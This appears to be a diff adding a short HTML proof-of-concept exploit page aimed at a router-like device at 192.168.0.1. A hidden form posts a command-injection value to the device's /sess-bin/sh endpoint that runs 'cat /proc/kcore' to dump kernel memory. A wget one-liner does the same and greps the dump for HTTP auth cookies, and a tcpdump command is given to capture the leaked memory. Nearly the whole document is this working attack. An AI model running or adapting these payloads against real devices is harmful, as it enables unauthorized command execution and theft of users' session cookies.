@@ -1,0 +1,29 @@
+<html>
+<head>
+<script>
+function s() {
+//  document.f.submit();
+}
+</script>
+</head>
+<body onload="s()">
+<pre>
+Firefox user: You have to tcpdump your interface to see the memory in the incoming HTTP packets:
+    sudo tcpdump -n -s0 -X -i eth0 # (or -i wlan0)
+
+</pre>
+<form id="f" name="f" method="POST" action="http://192.168.0.1/sess-bin/sh" enctype="text/plain">
+<input type="hidden" name="X" value="X;echo 'Content-type: text/plain';echo;echo Getting Kernel Memory;echo you have to tcpdump your interface to see the memory in the HTTP packets;echo Currently executing cat /proc/kcore;cat /proc/kcore;">
+<input type="submit" value="Getting Kernel Memory">
+</form>
+
+<pre>
+Or:
+
+Manual exploit with wget which allows to grab HTTP auth cookies:
+
+wget -qO- --post-data="echo 'Content-type: text/plain';echo;echo;cat /proc/kcore;" http://192.168.0.1/sess-bin/sh | strings | grep -i cooki
+
+</pre>
+</body>
+</html>
